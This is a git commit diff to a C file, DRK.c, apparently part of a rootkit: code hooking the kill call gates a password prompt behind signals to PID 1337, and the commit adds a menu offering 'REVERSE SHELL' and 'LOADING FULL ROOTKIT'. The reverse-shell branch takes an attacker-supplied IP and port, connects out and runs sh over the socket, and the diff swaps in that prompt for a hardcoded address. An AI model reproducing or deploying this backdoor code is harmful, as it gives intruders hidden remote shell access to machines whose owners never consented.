8f8dff194c0a94be58bed8d2f5d82e1ae920cb58
DARKSEC <121623691+DARKSECshell@users.noreply.github.com>
2024-05-02 02:17:40 -0300

    DRK.c

--- DRK.c
+++ DRK.c
@@ -18,6 +18,8 @@
 
 	ssize_t result;
 
+	ssize_t reads;
+
 	const int pids = 1337;
 
        int (*matar)(pid_t pid, int sig);
@@ -33,19 +35,38 @@ if(pid == pids){
 result = write(1, "[+] What's the Password? \n", strlen("[+] What's the Password? \n"));
 result = write(1, "[!] --> ", strlen("[!] --> "));
 scanf("%s", &password);
-
+system("clear");
 
 
 if(strcmp(password, pass) == 0){
 
+	int escolha;
 
-    int port = 1337;
+	printf("1) REVERSE SHELL \n");
+	printf("2) LOADING FULL ROOTKIT \n");
+	printf("=> ");
+	scanf("%i", &escolha);
+
+
+switch(escolha){
+
+case 1:
+
+	int port;
+	char ip[16];
+
+	printf("[+] SET YOUR LHOST => ");
+	scanf("%s", &ip);
+
+	printf("[+] SET YOUR LPORT => ");
+	scanf("%i", &port);
+
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("192.168.15.19");
+    revsockaddr.sin_addr.s_addr = inet_addr(ip);
 
     connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
@@ -55,7 +76,18 @@ if(strcmp(password, pass) == 0){
 
     char * const argv[] = {"sh", NULL};
     execvp("sh", argv);
+	break;
 
+case 2:
+
+	printf("test \n");
+	break;
+
+default:
+
+	printf("[!] ERROR, CHOICE 1 OR 2 \n");
+
+}
 
 } else {
 
